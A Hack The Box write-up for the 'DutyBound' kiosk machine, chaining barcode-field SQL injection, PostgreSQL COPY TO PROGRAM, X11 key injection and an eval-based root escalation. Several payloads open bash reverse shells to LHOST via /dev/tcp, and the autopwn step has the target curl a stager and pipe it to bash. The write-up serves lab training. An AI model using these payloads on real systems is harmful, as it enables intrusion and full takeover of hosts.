# DutyBound — HTB Write-up

**Author:** DonMorpheus (lab)
**Machine:** DutyBound (Release Arena, Linux kiosk)
**Host:** `airsnacks.htb`
**Scope:** HTB VPN / personal lab only

> **No flags** in this document.

Scripts: [`scripts/`](scripts/).

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | 22 OpenSSH, 80→443 nginx. Vhost `airsnacks.htb`. Cart JSON, then boarding-pass scan |
| Parser | IATA BCBP format M. Errors leak allowed **item 10 / item 17** hex sizes |
| Foothold | `airline_use` concatenated into SQL. Break out with `x');` then `COPY TO PROGRAM` as `postgres` |
| User | `/tmp/.X11-unix/X0` world-writable. python-xlib. Openbox grab `C-A-t` → `xterm` as `dutyfree-kiosk` |
| Root | Group `pos-ops` writes `duty-rates.csv`. `vrs-duty-apply.path` runs `eval "${tax_class}=${duty_pct}"` as root |

```
Kali tun0
  │
  ├─ 80/443  nginx  airsnacks.htb  gunicorn 127.0.0.1:8000
  │              POST /checkout/boarding-pass/verify  {raw}
  │
  └─ box  dutyfree-kiosk7
        postgres  COPY TO PROGRAM
        Xorg :0 + openbox + firefox --kiosk
        vrs-duty-apply.path  →  apply-duty-rates.sh (root)
```

---

## 1. Recon

```bash
echo '<TARGET_IP> airsnacks.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -p- <TARGET_IP>
```

Open from VPN: **22**, **80**, **443**. HTTP 301 → `https://airsnacks.htb/`. TLS is the real app.

`/browse` is the POS. `/cart/add` JSON `{sku}`. `/checkout/boarding-pass` 302s to `/browse` if the cart is empty. `/checkout/boarding-pass/verify` is **POST-only**. Empty cart → `CART_EMPTY`. Empty `raw` → `BCBP_ERR_FORMAT_CODE` (`expected 'M' at offset 0`). Short string → `BCBP_ERR_TRUNCATED` (`< 60`).

The scanner UI always posts `{raw: ""}` (hardware is “out of service”). The API still accepts an attacker-supplied barcode.

---

## 2. BCBP → `airline_use`

Format M, 60-byte mandatory unique+leg, last two bytes = hex length of the **conditional** tail:

```
> <version> <item10 unique hex> [unique] <item17 repeated hex> [repeated] [airline_use]
```

This parser is strict:

- Seat is `NNNA` or `INF ` (`BCBP_ERR_SEAT_FORMAT`)
- Item 10 ∈ `0B,18,25,32` (11 / 24 / 37 / 50 — IATA unique blocks)
- Item 17 ∈ `03,0D,0E,0F,12,15,25,26,29,2A`
- Item 22 (issue date) = 4-digit year+julian **or blank**

Shortest tail that parses:

- unique `0B` = 11 bytes e.g. `0WK    BBA `
- repeated `03` = 3 bytes e.g. `125`
- remainder = **airline_use** (unsanitized)

`scripts/bcbp.py` builds that. Item-6 hex on the mandatory trailer is `len(tail)`.

---

## 3. SQLi and `COPY TO PROGRAM`

A quote in `airline_use` returns the bound query:

```
..., 'LHR', 'JFK', '', '', 82, 'X'')
```

The original fragment is `..., N, 'PAYLOAD')`.

| Payload | Result |
|---------|--------|
| `X'` | unclosed string after the `)` |
| `1'; SELECT …` | `;` still **inside** the argument list |
| `x'); SELECT pg_sleep(3)--` | stacked; HTTP ~3 s |

PostgreSQL `COPY … TO PROGRAM` runs a shell as the server OS user (`postgres` here). Privilege: superuser or `pg_execute_server_program`.

```
x'); COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/PORT 0>&1"'--
```

`COPY` blocks until the child exits, so the HTTP client times out; the callback is already up.

```bash
nc -lvnp 4444
python3 scripts/02-postgres-rce.py --target "$TARGET" --lhost "$LHOST" --lport 4444
```

Smoke without a shell: `TO PROGRAM 'touch /tmp/pwn'`.

---

## 4. X11 → `dutyfree-kiosk`

`postgres` is not the kiosk user. `user.txt` lives in `/home/dutyfree-kiosk`.

```
srwxrwxrwx  /tmp/.X11-unix/X0
```

Xorg is `-nolisten tcp` with a serverauth file under `/tmp`; the **unix socket is 777**, so cookie theft is unnecessary. `python3-xlib` is on the box.

```bash
DISPLAY=:0 python3 -c 'from Xlib import display; print(display.Display().screen_count())'
# CONN 1
```

Session: `startx` → Openbox → `firefox --kiosk https://airsnacks.htb`. Firefox has focus; Openbox still **grabs** keys from `/etc/xdg/openbox/rc.xml`:

```xml
<keybind key="C-A-t">
  <action name="Execute"><command>xterm</command></action>
</keybind>
```

`scripts/03-xinject.py` (run **on the box**): `xtest.fake_input` Control_L+Alt_L+t, wait ~1.4 s, type a command, Return.

`--cmd` is typically a short curl of `kiosk.sh` so the typed line stays small.

---

## 5. systemd.path + `eval`

`dutyfree-kiosk` is in group **`pos-ops`**. `/opt/vrs/data/` is `root:pos-ops` `rwx`, `duty-rates.csv` is group-writable.

```
vrs-duty-apply.path
  PathModified=/opt/vrs/data/duty-rates.csv
  Unit=vrs-duty-apply.service          # oneshot, root
  ExecStart=/opt/vrs/bin/apply-duty-rates.sh
```

The apply script:

```bash
while IFS=, read -r tax_class duty_pct vat_pct; do
    [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]] || exit 1
    eval "${tax_class}=${duty_pct}"
done < "$RATES"
```

Columns 2 and 3 must be digits. Column 1 is **not** an identifier check. `IFS=,` means the payload **cannot contain commas**.

```
bash -c "bash -i >& /dev/tcp/LHOST/PORT 0>&1";x,1,0
```

becomes `eval 'bash -c "…";x=1'`. Keep the required category rows (`SPIRITS` … `CONFECTIONERY`) if you still want the rest of the script to run; a blocking reverse shell in the loop is enough for root.

`scripts/04-csv-root.sh` writes that file. `PathModified` needs an mtime bump (`touch`).

---

## Autopwn

`scripts/autopwn.py` serves `stager.sh` / `xinject.py` / `kiosk.sh`, then fires `COPY TO PROGRAM 'curl …/stager.sh|bash'`.

```bash
export TARGET=<ip> LHOST=<tun0>
nc -lvnp 6666   # kiosk
nc -lvnp 7777   # root
python3 scripts/autopwn.py --target "$TARGET" --lhost "$LHOST"
```

Keep the HTTP process up until both callbacks land.
